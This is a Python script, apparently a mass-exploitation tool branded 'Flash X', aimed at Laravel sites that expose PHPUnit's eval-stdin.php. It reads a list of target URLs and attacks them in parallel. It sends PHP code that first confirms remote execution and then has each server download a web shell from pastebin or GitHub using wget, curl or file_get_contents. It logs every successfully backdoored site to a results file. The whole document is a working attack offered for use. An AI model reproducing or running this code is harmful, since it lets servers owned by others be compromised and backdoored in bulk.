import os, time, re
from multiprocessing.dummy import Pool as ThreadPool
from multiprocessing import Pool
import threading
import sys
import requests as r
import requests as req
from colorama import Fore, Style

def screen_clear():
    _ = os.system('cls')


bl = Fore.BLUE
wh = Fore.WHITE
gr = Fore.GREEN
red = Fore.RED
res = Style.RESET_ALL
yl = Fore.YELLOW

headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0'}




def laravelrce1(url):
    try:
        checkvuln = '<?php echo php_uname("a"); ?>'
        shelluploader = '<?php system("wget https://pastebin.com/raw/nu5DZpA9 -O Flash.php"); ?>'
        Exploit = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=checkvuln, timeout=5)
        if 'Linux' in Exploit.text:
            print(f"[====> {yl} Alert Vulnerability {res}] {Exploit.text}")
            open('Result/VuLaravelPatch.txt', 'a').write(f"{Exploit.text}\n{url}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n")
            r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=shelluploader, timeout=5)
            CheckShell = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/Flash.php', timeout=5)
            if 'Flash-XUP' in CheckShell.text:
                print(f"{gr}#=======>>> Shell Uploaded Successfully : {res} {url}/vendor/phpunit/phpunit/src/Util/PHP/Flash.php")
                open('Result/Laravel.txt', 'a').write(f"{Exploit.text}\n{url}/vendor/phpunit/phpunit/src/Util/PHP/Flash.php\n")
                open('Result/Shell.txt', 'a').write(f"{url}/vendor/phpunit/phpunit/src/Util/PHP/Flash.php\n")
            else:
                print(f"{red}$-------> Shell Uploading Failed : {url}")
        else:
            print(f"{red}$-------> Site is not Vuln :  {url}")
    except:
        pass

def laravelrce2(url):
    try:
        checkvuln = '<?php echo php_uname("a"); ?>'
        shelluploader = '<?php fwrite(fopen("Flash.php","w+"),file_get_contents("https://raw.githubusercontent.com/rintod/toolol/master/payload.php")); ?>'
        Exploit = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=checkvuln, timeout=5)
        if 'linux' in Exploit.text:
            print(f"[====> {yl} Alert Vulnerability {res}] {Exploit.text}")
            open('Result/VuLaravelPatch.txt', 'a').write(f"{Exploit.text}\n{url}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n")
            r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=shelluploader, timeout=5)
            CheckShell = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/Flash.php', timeout=5)
            if 'Flash-XUP' in CheckShell.text:
                print(f"{gr}#=======>>> Shell Uploaded Successfully : {res} {url}/vendor/phpunit/phpunit/src/Util/PHP/Flash.php")
                open('Result/Shelled_Laravel.txt', 'a').write(f"{Exploit.text}\n{url}/vendor/phpunit/phpunit/src/Util/PHP/Flash.php\n")
                open('Result/Shell.txt', 'a').write(f"{url}/vendor/phpunit/phpunit/src/Util/PHP/Flash.php\n")
            else:
                print(f"{red}$-------> Shell Uploading Failed : {url}")
        else:
            print(f"{red}$-------> Site is not Vuln :  {url}")
    except:
        pass



def laravelrce3(url):
    try:
        checkvuln = '<?php echo php_uname("a"); ?>'
        upshell = '<?php system("curl -O https://pastebin.com/raw/3Qd5Cr2D); system("mv cezpVkxE Flash.php"); ?>'
        Exploit = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=checkvuln, timeout=5)
        if 'linux' in Exploit.text:
            print(f"[====> {yl} Alert Vulnerability {res}] {Exploit.text}")
            open('Result/VuLaravelPatch.txt', 'a').write(f"{Exploit.text}\n{url}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n")
            r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=upshell, timeout=5)
            CheckShell = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/Flash.php', timeout=5)
            if 'Flash-XUP' in CheckShell.text:
                print(f"{gr}#=======>>> Shell Uploaded Successfully : {res} {url}/vendor/phpunit/phpunit/src/Util/PHP/Flash.php")
                open('Result/Laravel.txt', 'a').write(f"{Exploit.text}\n{url}/vendor/phpunit/phpunit/src/Util/PHP/Flash.php\n")
                open('Result/Shell.txt', 'a').write(f"{url}/vendor/phpunit/phpunit/src/Util/PHP/Flash.php\n")
            else:
                print(f"{red}$-------> Shell Uploading Failed : {url}")
        else:
            print(f"{red}$-------> Site is not Vuln :  {url}")
    except:
        pass

def up(url):
    url = url.strip()
    try:
       laravelrce1(url)
       laravelrce2(url)
       laravelrce3(url)
    except:
       pass

def main():
    print(f'''
  ███████╗██╗░░░░░░█████╗░░██████╗██╗░░██╗  ██╗░░██╗
  ██╔════╝██║░░░░░██╔══██╗██╔════╝██║░░██║  ╚██╗██╔╝
  █████╗░░██║░░░░░███████║╚█████╗░███████║  ░╚███╔╝░
  ██╔══╝░░██║░░░░░██╔══██║░╚═══██╗██╔══██║  ░██╔██╗░
  ██║░░░░░███████╗██║░░██║██████╔╝██║░░██║  ██╔╝╚██╗
  ╚═╝░░░░░╚══════╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝  ╚═╝░░╚═╝
   ''')
    list = input(f"{gr}Please Input Your List : ")
    url = open(list, 'r').readlines()
    try:
       ThreadPool = Pool(50)
       ThreadPool.map(up, url)
       ThreadPool.close()
       ThreadPool.join()
    except:
       pass

if __name__ == '__main__':
    screen_clear()
    main()
